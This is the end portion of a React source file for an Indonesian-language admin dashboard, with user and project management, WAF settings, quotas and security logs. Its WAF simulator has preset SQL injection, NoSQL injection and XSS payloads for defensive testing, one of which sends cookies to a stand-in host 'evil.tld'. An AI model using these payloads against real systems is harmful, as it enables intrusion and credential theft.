                  <tbody className="divide-y divide-white/[0.05] text-xs">
                    {filteredUsers.map((u) => {
                      const isTargetOwner = isOwnerEmail(u.email);
                      const userProjectsCount = allProjects.filter(
                        (p) => p.uid === u.uid
                      ).length;
                      const effectiveQuota = isTargetOwner
                        ? 9999
                        : u.customMaxProjects ||
                          systemConfig.maxProjectsPerUser;

                      return (
                        <tr
                          key={u.uid}
                          className="hover:bg-white/[0.02] transition-colors"
                        >
                          <td className="py-3.5 px-4">
                            <div className="font-medium text-white">
                              {u.displayName}
                            </div>
                            <div className="text-[11px] font-mono text-zinc-400">
                              {u.email}
                            </div>
                            <div className="text-[10px] font-mono text-zinc-600">
                              UID: {u.uid}
                            </div>
                          </td>

                          <td className="py-3.5 px-4">
                            <div className="flex flex-wrap items-center gap-1.5">
                              {isTargetOwner ? (
                                <span className="px-2 py-0.5 rounded-full text-[10px] font-mono bg-amber-500/15 text-amber-300 border border-amber-500/30">
                                  SUPREME OWNER
                                </span>
                              ) : (
                                <span className="px-2 py-0.5 rounded-full text-[10px] font-mono bg-white/[0.05] text-zinc-300 border border-white/[0.08]">
                                  DEVELOPER
                                </span>
                              )}

                              <span
                                className={`px-2 py-0.5 rounded-full text-[10px] font-mono ${
                                  u.status === "suspended"
                                    ? "bg-rose-500/15 text-rose-300 border border-rose-500/30"
                                    : "bg-emerald-500/15 text-emerald-300 border border-emerald-500/30"
                                }`}
                              >
                                {u.status === "suspended"
                                  ? "SUSPENDED"
                                  : "ACTIVE"}
                              </span>
                            </div>
                          </td>

                          <td className="py-3.5 px-4 font-mono">
                            <span className="text-white font-semibold">
                              {userProjectsCount}
                            </span>{" "}
                            <span className="text-zinc-500">
                              / {effectiveQuota} proyek
                            </span>
                          </td>

                          <td className="py-3.5 px-4">
                            {isTargetOwner ? (
                              <span className="text-[11px] font-mono text-amber-300">
                                Tanpa Batas (∞)
                              </span>
                            ) : (
                              <div className="flex items-center gap-1.5">
                                <input
                                  type="number"
                                  min={1}
                                  max={500}
                                  defaultValue={effectiveQuota}
                                  onBlur={(e) =>
                                    handleUpdateUserQuota(
                                      u,
                                      Number(e.target.value)
                                    )
                                  }
                                  className="w-20 px-2 py-1 rounded-lg bg-[#050507] border border-white/[0.1] text-xs font-mono text-white"
                                />
                                <span className="text-[10px] font-mono text-zinc-500">
                                  maks
                                </span>
                              </div>
                            )}
                          </td>

                          <td className="py-3.5 px-4 text-right">
                            {isTargetOwner ? (
                              <span className="text-[11px] font-mono text-zinc-500">
                                Akun Inti Terlindungi
                              </span>
                            ) : (
                              <div className="inline-flex items-center gap-2">
                                <button
                                  type="button"
                                  onClick={() => handleToggleSuspendUser(u)}
                                  className={`px-2.5 py-1.5 rounded-lg text-[11px] font-medium border transition-colors ${
                                    u.status === "suspended"
                                      ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-300 hover:bg-emerald-500/20"
                                      : "bg-amber-500/10 border-amber-500/30 text-amber-300 hover:bg-amber-500/20"
                                  }`}
                                >
                                  {u.status === "suspended"
                                    ? "Pulihkan Akun"
                                    : "Suspend"}
                                </button>
                                <button
                                  type="button"
                                  onClick={() => handleDeleteUser(u)}
                                  title="Hapus Akun & Semua Proyeknya"
                                  className="p-1.5 rounded-lg bg-rose-500/10 border border-rose-500/25 text-rose-300 hover:bg-rose-500/20 transition-colors"
                                >
                                  <Trash2 className="w-3.5 h-3.5" />
                                </button>
                              </div>
                            )}
                          </td>
                        </tr>
                      );
                    })}
                  </tbody>
                </table>
              </div>
            </div>
          </div>
        )}

        {/* ================= TAB 3: INSPEKTOR PROYEK GLOBAL (GOD-MODE) ================= */}
        {activeTab === "projects" && (
          <div className="voam-glass rounded-2xl overflow-hidden">
            <div className="p-4 sm:px-6 border-b border-white/[0.07] flex flex-col sm:flex-row sm:items-center justify-between gap-3">
              <div>
                <h2 className="text-sm font-semibold text-white">
                  Inspektor Proyek Global — God Mode ({filteredProjects.length})
                </h2>
                <p className="text-xs text-zinc-400">
                  Inspeksi kode proyek milik pengguna mana saja di Monaco IDE,
                  bekukan proyek (karantina), atau hapus bundel.
                </p>
              </div>
              <div className="relative w-full sm:w-64">
                <Search className="w-3.5 h-3.5 text-zinc-500 absolute left-3 top-1/2 -translate-y-1/2" />
                <input
                  type="text"
                  value={projectSearch}
                  onChange={(e) => setProjectSearch(e.target.value)}
                  placeholder="Cari proyek atau email..."
                  className="voam-input pl-9 py-1.5 text-xs font-mono"
                />
              </div>
            </div>

            {filteredProjects.length === 0 ? (
              <div className="p-10 text-center text-xs text-zinc-400">
                Belum ada proyek yang cocok dengan pencarian Anda.
              </div>
            ) : (
              <div className="overflow-x-auto">
                <table className="w-full text-left border-collapse">
                  <thead>
                    <tr className="border-b border-white/[0.06] text-[11px] font-mono text-zinc-400 bg-white/[0.01]">
                      <th className="py-3 px-4">NAMA PROYEK &amp; ID</th>
                      <th className="py-3 px-4">PEMILIK (OWNER)</th>
                      <th className="py-3 px-4">BERKAS &amp; STATUS</th>
                      <th className="py-3 px-4">URL DEPLOYMENT</th>
                      <th className="py-3 px-4 text-right">KONTROL GOD-MODE</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-white/[0.05] text-xs">
                    {filteredProjects.map((proj) => {
                      const fileCount =
                        Object.keys(proj.fileSystem || {}).length ||
                        proj.fileCount;
                      const isQuarantined = proj.status === "quarantined";

                      return (
                        <tr
                          key={proj.id}
                          className="hover:bg-white/[0.02] transition-colors"
                        >
                          <td className="py-3.5 px-4">
                            <div className="font-semibold text-white">
                              {proj.name}
                            </div>
                            <div className="text-[10px] font-mono text-zinc-500">
                              {proj.id} • {proj.deploymentId}
                            </div>
                          </td>

                          <td className="py-3.5 px-4 font-mono text-[11px] text-zinc-300">
                            {proj.ownerEmail}
                          </td>

                          <td className="py-3.5 px-4">
                            <div className="flex items-center gap-2">
                              <span className="px-2 py-0.5 rounded bg-white/[0.04] border border-white/[0.07] font-mono text-[11px]">
                                {fileCount} file
                              </span>
                              <span
                                className={`px-2 py-0.5 rounded-full text-[10px] font-mono ${
                                  isQuarantined
                                    ? "bg-rose-500/15 text-rose-300 border border-rose-500/30"
                                    : "bg-emerald-500/15 text-emerald-300 border border-emerald-500/30"
                                }`}
                              >
                                {isQuarantined ? "QUARANTINED" : "DEPLOYED"}
                              </span>
                            </div>
                          </td>

                          <td className="py-3.5 px-4">
                            <a
                              href={proj.deploymentUrl}
                              target="_blank"
                              rel="noopener noreferrer"
                              className="inline-flex items-center gap-1 font-mono text-[11px] text-sky-400 hover:underline"
                            >
                              <span className="truncate max-w-[180px]">
                                {proj.deploymentUrl.replace(/^https?:\/\//, "")}
                              </span>
                              <ExternalLink className="w-3 h-3" />
                            </a>
                          </td>

                          <td className="py-3.5 px-4 text-right">
                            <div className="inline-flex items-center gap-2">
                              <button
                                type="button"
                                onClick={() =>
                                  router.push(`/project/${proj.id}`)
                                }
                                className="voam-btn-secondary py-1.5 px-2.5 text-[11px]"
                              >
                                <Code2 className="w-3.5 h-3.5" />
                                <span>Buka IDE</span>
                              </button>

                              <button
                                type="button"
                                onClick={() =>
                                  handleToggleProjectQuarantine(proj)
                                }
                                className={`px-2.5 py-1.5 rounded-lg text-[11px] font-medium border transition-colors ${
                                  isQuarantined
                                    ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-300"
                                    : "bg-amber-500/10 border-amber-500/30 text-amber-300"
                                }`}
                              >
                                {isQuarantined ? "Pulihkan" : "Karantina"}
                              </button>

                              <button
                                type="button"
                                onClick={() =>
                                  handleDeleteProjectByOwner(proj)
                                }
                                title="Hapus Proyek"
                                className="p-1.5 rounded-lg bg-rose-500/10 border border-rose-500/25 text-rose-300 hover:bg-rose-500/20"
                              >
                                <Trash2 className="w-3.5 h-3.5" />
                              </button>
                            </div>
                          </td>
                        </tr>
                      );
                    })}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        )}

        {/* ================= TAB 4: PERISAI WAF, ANTI-SQLi & SIMULATOR ================= */}
        {activeTab === "waf" && (
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
            {/* Kolom Kiri (7 Cols): Modul Perisai & Simulator Penetrasi */}
            <div className="lg:col-span-7 space-y-6">
              <div className="voam-glass rounded-2xl p-6 space-y-4">
                <h2 className="text-sm font-semibold text-white">
                  Konfigurasi Modul Firewall &amp; Sanitasi Input (WAF)
                </h2>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                  {[
                    {
                      key: "sqlInjectionShield" as const,
                      title: "Perisai Anti-SQL Injection",
                      desc: "Blokir UNION SELECT, OR 1=1, DROP/ALTER TABLE, SLEEP(), dan komentar SQL (--).",
                    },
                    {
                      key: "noSqlInjectionShield" as const,
                      title: "Perisai Anti-NoSQL / Firestore",
                      desc: "Blokir injeksi operator objek seperti $where, $gt, $ne, $regex, dan __proto__.",
                    },
                    {
                      key: "xssSanitizerShield" as const,
                      title: "Sanitasi XSS & Path Traversal",
                      desc: "Blokir tag <script>, event handler berbahaya, dan percobaan ../ lintas direktori.",
                    },
                    {
                      key: "requireHumanChallengeOnRegister" as const,
                      title: "Tantangan Anti-Bot Registrasi",
                      desc: "Wajibkan verifikasi matematika dinamis & honeypot saat pendaftaran akun.",
                    },
                  ].map((mod) => {
                    const active = systemConfig[mod.key];
                    return (
                      <div
                        key={mod.key}
                        className="p-4 rounded-xl bg-[#060609] border border-white/[0.08] flex flex-col justify-between gap-3"
                      >
                        <div>
                          <div className="flex items-center justify-between">
                            <span className="text-xs font-semibold text-white">
                              {mod.title}
                            </span>
                            <span
                              className={`px-2 py-0.5 rounded text-[10px] font-mono ${
                                active
                                  ? "bg-emerald-500/15 text-emerald-300 border border-emerald-500/30"
                                  : "bg-rose-500/15 text-rose-300"
                              }`}
                            >
                              {active ? "AKTIF" : "MATI"}
                            </span>
                          </div>
                          <p className="text-[11px] text-zinc-400 mt-1 leading-relaxed">
                            {mod.desc}
                          </p>
                        </div>

                        <button
                          type="button"
                          onClick={() =>
                            handleToggleConfigFlag(mod.key, mod.title)
                          }
                          className="voam-btn-secondary w-full justify-center py-1.5 text-xs"
                        >
                          {active ? "Nonaktifkan Modul" : "Aktifkan Modul"}
                        </button>
                      </div>
                    );
                  })}
                </div>
              </div>

              {/* Simulator Serangan WAF Interaktif */}
              <div className="voam-glass rounded-2xl p-6 space-y-4">
                <div className="flex items-center justify-between">
                  <div>
                    <h3 className="text-sm font-semibold text-white flex items-center gap-2">
                      <Terminal className="w-4 h-4 text-emerald-400" />
                      Simulator Uji Penetrasi WAF (Live Attack Tester)
                    </h3>
                    <p className="text-xs text-zinc-400 mt-0.5">
                      Uji bagaimana mesin WAF MainZ Voam menangkap dan memblokir
                      payload SQL Injection, NoSQL Injection, atau XSS secara
                      real-time.
                    </p>
                  </div>
                </div>

                {/* Preset Payload Uji Cepat */}
                <div className="flex flex-wrap gap-1.5">
                  {[
                    {
                      label: "Uji SQLi: ' OR 1=1 --",
                      payload: "admin@target.com' OR 1=1 --",
                    },
                    {
                      label: "Uji SQLi: UNION SELECT",
                      payload:
                        "project_x' UNION SELECT username, password FROM users --",
                    },
                    {
                      label: "Uji SQLi: DROP TABLE",
                      payload: "app; DROP TABLE projects; --",
                    },
                    {
                      label: 'Uji NoSQLi: {"$ne": null}',
                      payload:
                        '{"email": {"$ne": null}, "$where": "sleep(5000)"}',
                    },
                    {
                      label: "Uji XSS: <script>",
                      payload:
                        "<script>fetch('https://evil.tld?c='+document.cookie)</script>",
                    },
                    {
                      label: "Uji Input Aman",
                      payload: "proyek-cloud-portfolio-2026",
                    },
                  ].map((preset) => (
                    <button
                      key={preset.label}
                      type="button"
                      onClick={() => handleRunWafSimulation(preset.payload)}
                      className="px-2.5 py-1 rounded-lg bg-white/[0.04] hover:bg-white/[0.09] border border-white/[0.08] text-[11px] font-mono text-zinc-300 transition-colors"
                    >
                      {preset.label}
                    </button>
                  ))}
                </div>

                <div className="flex flex-col sm:flex-row gap-2.5">
                  <input
                    type="text"
                    value={wafTestInput}
                    onChange={(e) => setWafTestInput(e.target.value)}
                    placeholder="Ketik payload SQLi / NoSQLi / XSS untuk diuji..."
                    className="voam-input font-mono text-xs flex-1"
                  />
                  <button
                    type="button"
                    onClick={() => handleRunWafSimulation()}
                    className="voam-btn-primary shrink-0 text-xs"
                  >
                    <Shield className="w-4 h-4" />
                    <span>Inspeksi Payload</span>
                  </button>
                </div>

                {wafTestResult && (
                  <div
                    className={`p-4 rounded-xl border text-xs font-mono space-y-1 ${
                      wafTestResult.safe
                        ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-200"
                        : "bg-rose-500/10 border-rose-500/30 text-rose-200"
                    }`}
                  >
                    <div className="font-semibold">
                      {wafTestResult.safe
                        ? "STATUS: LOLOS INSPEKSI WAF (AMAN)"
                        : `STATUS: DIBLOKIR OLEH WAF (${wafTestResult.threatType})`}
                    </div>
                    <p className="text-[11px] opacity-90">
                      {wafTestResult.message}
                    </p>
                  </div>
                )}
              </div>
            </div>

            {/* Kolom Kanan (5 Cols): Blacklist Domain Email Sekali Pakai */}
            <div className="lg:col-span-5 space-y-6">
              <div className="voam-glass rounded-2xl p-6 space-y-4">
                <div>
                  <h3 className="text-sm font-semibold text-white">
                    Blacklist Domain Email Spam / Disposable (
                    {systemConfig.blockedEmailDomains.length})
                  </h3>
                  <p className="text-xs text-zinc-400 mt-1 leading-relaxed">
                    Semua pendaftaran akun menggunakan domain di bawah ini akan
                    langsung ditolak otomatis agar database tidak penuh oleh
                    akun bot sekali pakai.
                  </p>
                </div>

                <form onSubmit={handleAddBlockedDomain} className="flex gap-2">
                  <input
                    type="text"
                    value={newBlockedDomain}
                    onChange={(e) => setNewBlockedDomain(e.target.value)}
                    placeholder="contoh: spamdomain.xyz"
                    className="voam-input text-xs font-mono flex-1"
                  />
                  <button
                    type="submit"
                    className="voam-btn-primary text-xs shrink-0"
                  >
                    <Plus className="w-4 h-4" />
                    <span>Blokir</span>
                  </button>
                </form>

                <div className="flex flex-wrap gap-1.5 max-h-64 overflow-y-auto pt-1">
                  {systemConfig.blockedEmailDomains.map((dom) => (
                    <span
                      key={dom}
                      className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[#060609] border border-white/[0.08] text-xs font-mono text-zinc-300"
                    >
                      <span>@{dom}</span>
                      <button
                        type="button"
                        onClick={() => handleRemoveBlockedDomain(dom)}
                        className="text-zinc-500 hover:text-rose-400"
                        title="Hapus dari daftar blokir"
                      >
                        ×
                      </button>
                    </span>
                  ))}
                </div>
              </div>
            </div>
          </div>
        )}

        {/* ================= TAB 5: LIMITASI KUOTA DB & PENGUMUMAN GLOBAL ================= */}
        {activeTab === "quotas" && (
          <form
            onSubmit={handleSaveQuotasAndBroadcast}
            className="voam-glass rounded-2xl p-6 space-y-6"
          >
            <div>
              <h2 className="text-sm font-semibold text-white">
                Tata Kelola Kuota Database (Anti-Limit) &amp; Pengumuman Global
              </h2>
              <p className="text-xs text-zinc-400 mt-0.5">
                Atur batas maksimum penyimpanan dan laju pendaftaran agar
                database Firestore tidak pernah menyentuh limit karena spam.
              </p>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-5">
              <div className="space-y-1.5">
                <label className="block text-xs font-medium text-zinc-300">
                  Batas Maksimum Total Akun di Database
                </label>
                <input
                  type="number"
                  min={5}
                  max={100000}
                  value={quotaMaxUsers}
                  onChange={(e) => setQuotaMaxUsers(Number(e.target.value))}
                  className="voam-input font-mono text-xs"
                />
                <p className="text-[11px] text-zinc-500">
                  Pendaftaran baru otomatis terkunci jika jumlah akun mencapai
                  angka ini.
                </p>
              </div>

              <div className="space-y-1.5">
                <label className="block text-xs font-medium text-zinc-300">
                  Kuota Default Proyek per Akun Developer
                </label>
                <input
                  type="number"
                  min={1}
                  max={500}
                  value={quotaMaxProjectsPerUser}
                  onChange={(e) =>
                    setQuotaMaxProjectsPerUser(Number(e.target.value))
                  }
                  className="voam-input font-mono text-xs"
                />
                <p className="text-[11px] text-zinc-500">
                  Jumlah maksimum proyek yang dapat dibuat oleh setiap akun
                  standar.
                </p>
              </div>

              <div className="space-y-1.5">
                <label className="block text-xs font-medium text-zinc-300">
                  Maksimum Berkas (File) per Proyek
                </label>
                <input
                  type="number"
                  min={3}
                  max={500}
                  value={quotaMaxFilesPerProject}
                  onChange={(e) =>
                    setQuotaMaxFilesPerProject(Number(e.target.value))
                  }
                  className="voam-input font-mono text-xs"
                />
                <p className="text-[11px] text-zinc-500">
                  Mencegah unggahan bundel ZIP raksasa yang membebani dokumen
                  Firestore.
                </p>
              </div>

              <div className="space-y-1.5">
                <label className="block text-xs font-medium text-zinc-300">
                  Maksimum Ukuran FileSystem per Proyek (KB)
                </label>
                <input
                  type="number"
                  min={50}
                  max={900}
                  value={quotaMaxSizeKb}
                  onChange={(e) => setQuotaMaxSizeKb(Number(e.target.value))}
                  className="voam-input font-mono text-xs"
                />
                <p className="text-[11px] text-zinc-500">
                  Batas aman di bawah limit 1 MB per dokumen Cloud Firestore.
                </p>
              </div>

              <div className="space-y-1.5">
                <label className="block text-xs font-medium text-zinc-300">
                  Maksimum Registrasi per Jendela 15 Menit
                </label>
                <input
                  type="number"
                  min={1}
                  max={100}
                  value={rateMaxRegWindow}
                  onChange={(e) => setRateMaxRegWindow(Number(e.target.value))}
                  className="voam-input font-mono text-xs"
                />
                <p className="text-[11px] text-zinc-500">
                  Mencegah pembuatan banyak akun beruntun oleh satu klien.
                </p>
              </div>

              <div className="space-y-1.5">
                <label className="block text-xs font-medium text-zinc-300">
                  Cooldown Antar Registrasi (Detik)
                </label>
                <input
                  type="number"
                  min={0}
                  max={3600}
                  value={rateCooldownSec}
                  onChange={(e) => setRateCooldownSec(Number(e.target.value))}
                  className="voam-input font-mono text-xs"
                />
                <p className="text-[11px] text-zinc-500">
                  Jeda waktu wajib sebelum sesi yang sama dapat mendaftar lagi.
                </p>
              </div>
            </div>

            <div className="pt-2 border-t border-white/[0.06] space-y-2">
              <label className="block text-xs font-medium text-zinc-300 flex items-center gap-2">
                <Megaphone className="w-4 h-4 text-sky-400" />
                Banner Pengumuman Global (Tampil di Login &amp; Dashboard
                Seluruh Pengguna)
              </label>
              <input
                type="text"
                maxLength={240}
                value={announcementDraft}
                onChange={(e) => setAnnouncementDraft(e.target.value)}
                placeholder="Kosongkan jika tidak ingin menampilkan banner pengumuman global..."
                className="voam-input text-xs font-mono"
              />
            </div>

            <div className="flex justify-end">
              <button type="submit" className="voam-btn-primary">
                <CheckCircle2 className="w-4 h-4" />
                <span>Simpan Kebijakan Kuota &amp; Broadcast</span>
              </button>
            </div>
          </form>
        )}

        {/* ================= TAB 6: LOG AUDIT & FORENSIK KEAMANAN ================= */}
        {activeTab === "logs" && (
          <div className="voam-glass rounded-2xl overflow-hidden">
            <div className="p-4 sm:px-6 border-b border-white/[0.07] flex flex-col sm:flex-row sm:items-center justify-between gap-3">
              <div>
                <h2 className="text-sm font-semibold text-white">
                  Log Forensik Keamanan WAF &amp; Aktivitas Owner (
                  {filteredLogs.length})
                </h2>
                <p className="text-xs text-zinc-400">
                  Rekaman setiap percobaan SQL Injection, NoSQL Injection, XSS,
                  Rate-Limit Spam, serta perubahan konfigurasi Owner.
                </p>
              </div>

              <div className="flex items-center gap-2">
                <select
                  value={logFilter}
                  onChange={(e) => setLogFilter(e.target.value)}
                  className="px-3 py-1.5 rounded-xl bg-[#050507] border border-white/[0.1] text-xs font-mono text-zinc-200"
                >
                  <option value="all">Semua Kejadian</option>
                  <option value="SQL_INJECTION_BLOCKED">
                    SQL Injection Blocked
                  </option>
                  <option value="NOSQL_INJECTION_BLOCKED">
                    NoSQL Injection Blocked
                  </option>
                  <option value="XSS_PAYLOAD_BLOCKED">XSS Blocked</option>
                  <option value="SPAM_REGISTRATION_BLOCKED">
                    Spam Registration Blocked
                  </option>
                  <option value="RATE_LIMIT_TRIGGERED">
                    Rate Limit Triggered
                  </option>
                  <option value="DB_QUOTA_ENFORCED">DB Quota Enforced</option>
                  <option value="OWNER_CONFIG_UPDATED">
                    Aktivitas Konfigurasi Owner
                  </option>
                  <option value="USER_STATUS_CHANGED">
                    Perubahan Status User
                  </option>
                </select>

                <button
                  type="button"
                  onClick={() => {
                    clearSecurityLogs();
                    setSecurityLogs([]);
                    setIslandStatus("deployed", "Log Forensik Dibersihkan", {
                      autoResetMs: 2200,
                    });
                  }}
                  className="voam-btn-secondary py-1.5 text-xs"
                >
                  <Trash2 className="w-3.5 h-3.5" />
                  <span>Bersihkan</span>
                </button>
              </div>
            </div>

            {filteredLogs.length === 0 ? (
              <div className="p-10 text-center text-xs text-zinc-400">
                Belum ada rekaman insiden keamanan pada kategori ini.
              </div>
            ) : (
              <div className="overflow-x-auto">
                <table className="w-full text-left border-collapse">
                  <thead>
                    <tr className="border-b border-white/[0.06] text-[11px] font-mono text-zinc-400 bg-white/[0.01]">
                      <th className="py-3 px-4">WAKTU</th>
                      <th className="py-3 px-4">KATEGORI &amp; LEVEL</th>
                      <th className="py-3 px-4">AKTOR / TARGET</th>
                      <th className="py-3 px-4">DETAIL &amp; CUPLIKAN PAYLOAD</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-white/[0.05] text-xs">
                    {filteredLogs.map((log) => (
                      <tr
                        key={log.id}
                        className="hover:bg-white/[0.02] transition-colors"
                      >
                        <td className="py-3 px-4 font-mono text-[11px] text-zinc-400 whitespace-nowrap">
                          {new Date(log.timestamp).toLocaleString("id-ID")}
                        </td>
                        <td className="py-3 px-4">
                          <span
                            className={`inline-flex px-2 py-0.5 rounded text-[10px] font-mono ${
                              log.severity === "critical"
                                ? "bg-rose-500/20 text-rose-300 border border-rose-500/30"
                                : log.severity === "warning"
                                ? "bg-amber-500/20 text-amber-300 border border-amber-500/30"
                                : "bg-sky-500/15 text-sky-300 border border-sky-500/25"
                            }`}
                          >
                            {log.type} ({log.severity.toUpperCase()})
                          </span>
                        </td>
                        <td className="py-3 px-4 font-mono text-[11px]">
                          <div className="text-zinc-200">{log.actorEmail}</div>
                          <div className="text-zinc-500">
                            {log.targetResource}
                          </div>
                        </td>
                        <td className="py-3 px-4">
                          <div className="text-zinc-200">{log.details}</div>
                          {log.blockedPayload && (
                            <code className="mt-1 inline-block px-2 py-0.5 rounded bg-[#050507] border border-white/[0.07] text-[10px] font-mono text-rose-300 max-w-md truncate">
                              {log.blockedPayload}
                            </code>
                          )}
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        )}
      </main>
    </div>
  );
}

export default withAuthGuard(OwnerCommandCenterContent);
